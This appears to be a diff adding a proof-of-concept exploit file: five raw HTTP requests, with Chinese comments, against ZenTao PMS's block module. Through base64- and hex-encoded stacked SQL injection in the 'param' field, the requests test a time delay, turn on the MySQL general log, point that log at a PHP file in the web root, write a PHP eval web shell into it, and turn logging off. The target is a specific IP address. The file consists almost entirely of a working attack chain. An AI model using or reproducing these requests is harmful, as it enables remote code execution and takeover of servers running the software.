@@ -1,0 +1,24 @@
+//sleep（5）
+GET /zentaopms/www/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== HTTP/1.1
+Host: 118.193.36.37:10363
+Referer:http://118.193.36.37:10363/zentaopms/
+
+//开启日志：set global general_log='on'; 
+GET /zentaopms/www/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjczZDI3NmY2ZTI3M2I7UFJFUEFSRSBwb3JkIEZST00gQFNRTDtFWEVDVVRFIHBvcmQ7LS0gLSIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= HTTP/1.1
+Host: 118.193.36.37:10363
+Referer:http://118.193.36.37:10363/zentaopms/
+
+//更改日志路径：set global general_log_file='/www/zentaopms/module/misc/ext/model/foo.php'; 
+GET /zentaopms/www/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjc1ZjY2Njk2YzY1M2QyNzJmNzc3Nzc3MmY3YTY1NmU3NDYxNmY3MDZkNzMyZjZkNmY2NDc1NmM2NTJmNmQ2OTczNjMyZjY1Nzg3NDJmNmQ2ZjY0NjU2YzJmNjY2ZjZmMmU3MDY4NzAyNzNiO1BSRVBBUkUgcG9yZCBGUk9NIEBTUUw7RVhFQ1VURSBwb3JkOy0tIC0iLCJudW0iOiIxLDEiLCJ0eXBlIjoib3BlbmVkYnltZSJ9 HTTP/1.1
+Host: 118.193.36.37:10363
+Referer:http://118.193.36.37:10363/zentaopms/
+
+//注入shell语句：select '<?php @eval($_POST[1])?>';
+GET /zentaopms/www/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTZjNjU2Mzc0MjAyNzNjM2Y3MDY4NzAyMDQwNjU3NjYxNmMyODI0NWY1MDRmNTM1NDViMzE1ZDI5M2YzZTI3M2I7UFJFUEFSRSBwb3JkIEZST00gQFNRTDtFWEVDVVRFIHBvcmQ7LS0gLSIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= HTTP/1.1
+Host: 118.193.36.37:10363
+Referer:http://118.193.36.37:10363/zentaopms/
+
+//关闭日志:set global general_log='off';
+GET /zentaopms/www/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjczZDI3NmY2NjY2MjczYjtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== HTTP/1.1
+Host: 118.193.36.37:10363
+Referer:http://118.193.36.37:10363/zentaopms/
